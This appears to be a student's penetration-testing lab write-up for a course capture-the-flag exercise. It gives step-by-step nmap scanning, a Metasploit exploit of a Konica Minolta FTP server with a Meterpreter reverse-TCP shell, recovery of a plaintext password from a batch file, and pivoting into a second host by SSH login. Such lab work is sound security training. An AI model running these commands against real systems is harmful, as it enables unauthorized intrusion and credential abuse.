# Assigment 1
For full executive report, see [PWNChallenge1_GabriellaAhn](https://github.com/haein001/CMU_penetration-testing/blob/69735350464e7b4b88eede348b337de66701a3e0/pwnchallenge1/PWNChallenge1_GabriellaAhn.pdf).

## Step 1
1. Scan the host for open ports.

    ``
    nmap -open 10.20.160.10-150
    nmap -open 10.20.170.20-100
    ``

    10.20.160.41 host is found from 10.20.160.10-150.

2. Conduct more thorough scan of 10.20.160.41.
   
    ``
    nmap --A 10.20.160.41
    ``
    
    Port 21 is an open port for FTP from version of Konica Minolta FTP Utility. 
    
3. Open Metasploit.

    ``
    msfconsole
    ``
    
4. Since we are going to use _Konica Minolta FTP Utility_ to exploit the host, serach Konica. Use the exploit from the search result.

    ``
    search Konica
    use exploit/windows/ftp/kmftp_utility_cwd
    ``
   
5. Set rhost, rport, and payload.
    
    ``
    set RHOST 10.20.160.41
    set RPORT 21
    set PAYLOAD windows/meterpreter/reverse_tcp
    ``

6. Then, exploit

    ``
    exploit
    ``
    
7. Now you are in the system. Use various command to look for the flag.

    ``
    search -f proof.txt
    ``

8. In C:\Users\Fred\Desktop. there is SSH.bat which looks strange. Open the file.

    ``
    cat SSH.bat
    ``
    
    ![image](https://github.com/haein001/CMU_penetration-testing/assets/77334059/5c0d8d0e-f2cc-4c4c-ad79-2247619e3a0d)

9. Using this we are going to compromise the other host. In order to add route from present session, use autoroute.

- **autoroute:** is used to add routes associated with the specified Meterpreter session to Metasploit's routing table. These routes can be used to pivot to private networks and resources that can be accessed by the compromised machine.

    It will make my current session into background session.

    ``
    run autoroute -s 10.20.170.0
    run autoroute -p
    background
    ``
    
10.  Search ssh_login, to use the information from the SSH.bat.

    ``
    search ssh_login
    ``
    
11. Set the basic information for the exploit.

    ``
    use auxiliary/scanner/ssh/ssh_login
    set USERNAME jill
    set PASSWORD JillIs100%Awesome
    set rhost 10.20.170.87
    exploit
    ``

12.  After succesfully logging into the machine, check the session you are in and go to the new session that is created.

     ``
    sessions -i
    sessions -i (number)
    ``

13.  Then, use linux command to search the proof.txt.

